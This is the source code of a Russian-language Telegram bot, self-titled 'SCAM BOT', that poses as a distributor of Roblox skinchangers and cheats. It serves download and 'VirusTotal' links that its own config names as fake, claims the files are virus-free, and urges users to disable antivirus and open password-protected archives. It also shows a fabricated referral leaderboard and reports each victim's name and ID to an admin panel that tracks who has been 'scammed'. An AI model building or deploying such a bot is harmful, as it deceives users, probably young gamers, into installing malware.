from aiogram import Bot, Dispatcher, executor, types
import logging
import json
import hashlib
from db import Database
from colorama import Fore
from hashlib import md5

__version__ = (0, 2, 0)

label = f'''

        {Fore.RED} ____   ____    _    __  __   ____   ___ _____ 
        {Fore.YELLOW}/ ___| / ___|  / \  |  \/  | | __ ) / _ \_   _|
        {Fore.LIGHTYELLOW_EX}\___ \| |     / _ \ | |\/| | |  _ \| | | || |  
        {Fore.LIGHTCYAN_EX} ___) | |___ / ___ \| |  | | | |_) | |_| || |  
        {Fore.BLUE}|____/ \____/_/   \_\_|  |_| |____/ \___/ |_| 

                    {Fore.LIGHTBLACK_EX}Made by: {Fore.RESET}{Fore.RED}fairet{Fore.RESET}

                    {Fore.LIGHTCYAN_EX}[1] Start Bot (TOKEN+__admin_id__)
                    [2] Install Requirements
                    [3] Exit {Fore.RESET}
    '''
print(label)
choice = input(f"{Fore.LIGHTCYAN_EX}Choose: {Fore.RESET}")

def parse_config(setting):
    with open('config.json', 'r') as file:
        settings = json.load(file)

    return settings['config'][f'{setting}']

__token__ = parse_config('cfg_token')
__admin_id__ = parse_config('admin_id')
__default_id__ = parse_config('default_id')

__nameofcompany__ = parse_config('name')
__helpid__ = parse_config('help')

__fake_vt_1__ = parse_config('fake0_vt')
__fake_2_vt__ = parse_config('fake1_vt')
__fake_1__ = parse_config('fake0')
__fake_2__ = parse_config('fake1')

__password_1__ = parse_config('skinp')
__password_2__ = parse_config('cheatp')


if choice == '3':
    exit()

elif choice == '2':
    print(f"{Fore.BLACK}Write 'pip install -r requirements.txt' \nTY, then restart the bot{Fore.RESET}")
    input()

else:
    print(f"\n"                                  
            f"{Fore.MAGENTA}Your Admin Id: {__admin_id__}"
            f"\n"
            f"To use Admin Panel: write 'adm'{Fore.RESET}")
    
bot = Bot(__token__)
db = Database('users.db')
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def welcome(message: types.Message):

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="–í—ã–±–µ—Ä–∏—Ç–µ –∫–Ω–æ–ø–∫—É: ")
    start = types.KeyboardButton("ü•∑üèª –ü–†–û–§–ò–õ–¨")
    top = types.KeyboardButton("üìä –¢–û–ü")
    help = types.KeyboardButton("‚ú® –ü–û–ú–û–©–¨")
    soft = types.KeyboardButton("üëÄ –°–û–§–¢")

    if not db.user_exists(message.from_user.id):
        db.add_user(message.from_user.id)
        await bot.send_message(
            message.from_user.id,
            f"üôå–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É–µ–º! –≠—Ç–æ –∫–æ–º–∞–Ω–¥–∞ {__nameofcompany__}. \nüë®‚Äçüíª–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–∏–∫–Ω–µ–π–º:")
    else:
        markup.add(start, soft, top, help)
        await bot.send_message(
            message.from_user.id,"üî• –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, –∑–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å\n\nüëΩ Skinchanger Roblox 2.3.1 by n0nBann3d\nüëæ EazyScript by crash1d\n\n‚ö†Ô∏è–í—Å–µ —Ñ–∞–π–ª—ã –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è –Ω–∞ –ø–∫!\n‚ôªÔ∏è –ù–∏–∫–∞–∫–∏—Ö –≤–∏—Ä—É—Å–æ–≤ –Ω–µ—Ç!",
            reply_markup=markup)

@dp.message_handler(content_types=['text'])
async def bot_message(message: types.Message):

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="–í—ã–±–µ—Ä–∏—Ç–µ –∫–Ω–æ–ø–∫—É: ")

    if message.chat.type == 'private':

        ref = types.InlineKeyboardMarkup(row_width=2)
        default_id = 1058852120
        scam = types.InlineKeyboardButton(text="üëã –ü—Ä–∏–≥–ª–∞—Å–∏—Ç—å", callback_data="ref")
        back = types.InlineKeyboardButton(text="‚Ü©Ô∏è –í–ï–†–ù–£–¢–¨–°–Ø", callback_data="back1")

        ref.insert(scam)
        ref.insert(back)
        if message.text == 'ü•∑üèª –ü–†–û–§–ò–õ–¨' or message.text == '/profile':

            user_nickname = f"üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å!" \
                            f"\n‚†Ä‚†Ä  " \
                            f"\nüßë‚Äçüíª –í–∞—à –ø—Å–µ–≤–¥–æ–Ω–∏–º: {db.get_nickname(message.from_user.id)} \nüéÅ –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∞—à–∏—Ö —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: "
            await bot.send_message(message.from_user.id, text=user_nickname, reply_markup=ref)

        elif message.text == '‚ú® –ü–û–ú–û–©–¨':
            await bot.send_message(message.from_user.id, f"üî± –ö–æ–Ω—Ç–∞–∫—Ç –¥–ª—è –ø–æ–º–æ—â–∏: {__helpid__}")

        elif message.text == 'üìä –¢–û–ü':
            await bot.send_message(message.from_user.id,    #   FAKE REFERALS
                                    "üî∞ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞. –ë–∞–ª–ª—ã –≤—ã–¥–∞—é—Ç—Å—è –∑–∞ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ –ª—é–¥–µ–π!\n"
                                    "ü•á –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 16 \n"
                                    "ü•à –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 13\n"
                                    "ü•â –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 11\n"
                                    "4. –ù–∏–∫: @Shock680 –†–µ—Ñ–µ—Ä–∞–ª—ã: 9\n"
                                    "5. –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 8\n"
                                    "6. –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 6\n"
                                    "7. –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 5\n"
                                    "8. –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 4\n"
                                    "9.... –ù–∏–∫: –°–∫—Ä—ã—Ç—ã–π –†–µ—Ñ–µ—Ä–∞–ª—ã: 3")


        elif message.text == 'üëÄ –°–û–§–¢':

            inline = types.InlineKeyboardMarkup(row_width=2)
            skinchange = types.InlineKeyboardButton(text="‚ú® –°–ö–ò–ù–ß–ï–ù–î–ñ–ï–†",
                                                    callback_data="skin")
            cheats = types.InlineKeyboardButton(text="üöÄ –ß–ò–¢–´", callback_data="cheat")
            back = types.InlineKeyboardButton(text="‚Ü©Ô∏è –í–ï–†–ù–£–¢–¨–°–Ø", callback_data="back1") 

            inline.insert(skinchange)
            inline.insert(cheats)
            inline.insert(back)

            await bot.send_message(message.from_user.id,
                                    text="‚¨áÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø: ",
                                    reply_markup=inline)

        else:
            if db.get_signup(message.from_user.id) == "setnickname":

                if (len(message.text) > 15):
                    await bot.send_message(message.from_user.id,
                                            "‚õîÔ∏è –ü—Å–µ–≤–¥–æ–Ω–∏–º –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –º–µ–Ω—å—à–µ 15 —Å–∏–º–≤–æ–ª–æ–≤.")
                elif '@' in message.text or '/' in message.text:
                    await bot.send_message(message.from_user.id,
                                            "‚õîÔ∏è –í—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã (@, /)")
                else:
                    db.set_nickname(message.from_user.id, message.text)
                    db.set_signup(message.from_user.id, "Registred")
                    await bot.send_message(message.from_user.id,
                                            "‚úÖ –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!",
                                            reply_markup=markup)

            else:
                default_id = 1058852120
                if message.chat.id == __admin_id__ or message.chat.id == default_id:
                    # ADMIN PANEL
                    if message.text == "adm":
                        adm = types.InlineKeyboardMarkup(row_width=2)

                        refreal = types.InlineKeyboardButton(text="—Ä–µ—Ñ–∫–∏", callback_data="reff")
                        ban = types.InlineKeyboardButton(text="–∑–∞–±–∞–Ω–∏—Ç—å", callback_data="ban")
                        razban = types.InlineKeyboardButton(text="—Ä–∞–∑–±–∞–Ω–∏—Ç—å", callback_data="razban")
                        status = types.InlineKeyboardButton(text="–∑–∞—Å–∫–∞–º–ª–µ–Ω –ª–∏", callback_data="scamed")
                        users = types.InlineKeyboardButton(text="—é–∑–µ—Ä—ã", callback_data="users")

                        adm.insert(refreal)
                        adm.insert(status)
                        adm.insert(ban)
                        adm.insert(razban)
                        adm.insert(users)

                        await bot.send_message(message.from_user.id, text=f"–í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:  \n"
                                                                f"–í—Å–µ–≥–æ –∑–∞—Å–∫–∞–º–ª–µ–Ω–æ:  \n"
                                                                f"–í—Å–µ–≥–æ –Ω–µ –∑–∞—Å–∫–∞–º–ª–µ–Ω–æ: ",
                                                reply_markup=adm)

                else:

                    await bot.send_message(message.from_user.id,
                                            "üö´ –í–≤–µ–¥–∏—Ç–µ –ø–æ–∂–∞–ª—É–π—Å—Ç–∞ /start")
# Under the Developemt
@dp.callback_query_handler(text="ref")
async def ref(call: types.CallbackQuery):
    ref = types.InlineKeyboardMarkup(row_width=2)

    scam = types.InlineKeyboardButton(text="üëã –°—Å—ã–ª–∫–∞", callback_data="ref")
    back = types.InlineKeyboardButton(text="‚Ü©Ô∏è –í–ï–†–ù–£–¢–¨–°–Ø", callback_data="back1")

    ref.insert(scam)
    ref.insert(back)
    await call.message.edit_text(text="Under The Developement")
    await call.message.edit_reply_markup(reply_markup=ref)


@dp.callback_query_handler(text='skin')
async def choice1(call: types.CallbackQuery):

    await bot.send_message(__admin_id__ or __default_id__, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')

    skins = types.InlineKeyboardMarkup(row_width=2)
    vt1 = types.InlineKeyboardButton(
        
        text="‚ôªÔ∏è VirusTotal",
        callback_data="main",
        url=
        __fake_vt_1__
    )
    download1 = types.InlineKeyboardButton(
        text="üî• –°–∫–∞—á–∞—Ç—å",
        callback_data="main",
        url=
        __fake_1__)

    back = types.InlineKeyboardButton(
        text="‚Ü©Ô∏è –í–ï–†–ù–£–¢–¨–°–Ø",  # 2
        callback_data="back")

    skins.insert(vt1)
    skins.insert(download1)
    skins.insert(back)
    await call.message.edit_text(
        text=f'''‚ôªÔ∏è Skinchanger Roblox 2.3.1 by n0nBann3d\n‚îî–î–æ—Å—Ç—É–ø–Ω—ã–µ —Ä–µ–∂–∏–º—ã:\n\nü§© Pet Simulator X\nüòº Blox Fruits (fixed)\nüëäüèª Jailbreak (new)\n üë• Adopt Me! (fixed)\nüöÄ Mad City (new)\n‚ù§Ô∏è MeetCity (new)\n\n‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n\n‚ú® VirusTotal - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∫–∏–Ω—á–µ–Ω–¥–∂–µ—Ä–∞ –Ω–∞ 59 –≤–∏—Ä—É—Å–æ–≤!\n‚úàÔ∏è –ï—Å–ª–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å —Ä—É–≥–∞–µ—Ç—Å—è –Ω–∞ –Ω–∞—à —Ñ–∞–π–ª, —Å–æ–≤–µ—Ç—É–µ–º –≤—ã–∫–ª—é—á–∏—Ç—å –µ–≥–æ!\n\nüòæ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –≤–Ω—É—Ç—Ä–∏ –∞—Ä—Ö–∏–≤–∞!\nüî• –ü–∞—Ä–æ–ª—å –æ—Ç –∞—Ä—Ö–∏–≤–∞: {__password_1__}''')
    await call.message.edit_reply_markup(reply_markup=skins)

@dp.callback_query_handler(text="cheat")
async def choice2(call: types.CallbackQuery):

    await bot.send_message(__admin_id__ or __default_id__, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')
    skins = types.InlineKeyboardMarkup(row_width=2)
    vt1 = types.InlineKeyboardButton(
        text="‚ôªÔ∏è VirusTotal",
        callback_data="main",
        url=
        __fake_2_vt__
    )
    download1 = types.InlineKeyboardButton(
        text="üî• –°–∫–∞—á–∞—Ç—å",
        callback_data="main",
        url=
        __fake_2__
    )

    back = types.InlineKeyboardButton(
        text="‚Ü©Ô∏è –í–ï–†–ù–£–¢–¨–°–Ø",  # 3
        callback_data="back"
    )
    skins.insert(vt1)
    skins.insert(download1)         
    skins.insert(back)
    await call.message.edit_text(
        text=f'''üî• EazyScript by crash1d\n‚îî–§—É–Ω–∫—Ü–∏–∏:\n\nüö∑ ANTI-AFK(üî•–£–ù–ò–ö–ê–õ–¨–ù–û–ï)ü§©\n Visuals(best)üìµ\n Auto-farmüëäüèª\n Flyhack(new)\n üë• Sizechanger (üî•NEW)\n\n ‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n\n üöÄ VirusTotal - –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–∏—Ç–∞ –Ω–∞ 59 –≤–∏—Ä—É—Å–æ–≤!\nüòº –ï—Å–ª–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å —Ä—É–≥–∞–µ—Ç—Å—è –Ω–∞ –Ω–∞—à —Ñ–∞–π–ª, —Å–æ–≤–µ—Ç—É–µ–º –≤—ã–∫–ª—é—á–∏—Ç—å –µ–≥–æ!\n\n‚úàÔ∏è –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –≤–Ω—É—Ç—Ä–∏ –∞—Ä—Ö–∏–≤–∞!\nüëäüèª –ü–∞—Ä–æ–ª—å –æ—Ç –∞—Ä—Ö–∏–≤–∞: {__password_2__}''')
    await call.message.edit_reply_markup(reply_markup=skins)

@dp.callback_query_handler(text="back")
async def choice3(call: types.CallbackQuery):

    inline = types.InlineKeyboardMarkup(row_width=2)
    skinchange = types.InlineKeyboardButton(text="‚ú® –°–ö–ò–ù–ß–ï–ù–î–ñ–ï–†",
                                            callback_data="skin")
    cheats = types.InlineKeyboardButton(text="üöÄ –ß–ò–¢–´", callback_data="cheat")
    back = types.InlineKeyboardButton(text="‚Ü©Ô∏è –í–ï–†–ù–£–¢–¨–°–Ø", callback_data="back1")  # 1

    inline.insert(skinchange)
    inline.insert(cheats)
    inline.insert(back)
    await call.message.edit_text(text="‚¨áÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø: ")
    await call.message.edit_reply_markup(reply_markup=inline)


@dp.callback_query_handler(text="back1")
async def choice4(call: types.CallbackQuery):

    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2,
        input_field_placeholder="–í—ã–±–µ—Ä–∏—Ç–µ –∫–Ω–æ–ø–∫—É: ")

    await call.message.edit_text("‚¨áÔ∏è –ù–∞–ø–∏—à–∏—Ç–µ –ø–æ–∂–∞–ª—É–π—Å—Ç–∞ /start")
    start = types.KeyboardButton("ü•∑üèª –ü–†–û–§–ò–õ–¨")
    top = types.KeyboardButton("üìä –¢–û–ü")
    help = types.KeyboardButton("‚ú® –ü–û–ú–û–©–¨")
    soft = types.KeyboardButton("üëÄ –°–û–§–¢")
    markup.add(start, soft, top, help)

@dp.callback_query_handler(text="main")
async def scamed(call: types.CallbackQuery):
    await bot.send_message(__admin_id__ or __default_id__, text=f'''{call.from_user.full_name}\n@{call.from_user.username}\n{call.from_user.id}''')

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    print("")
    executor.start_polling(dp, skip_updates=True)
else:
    print("Any problems with __main__")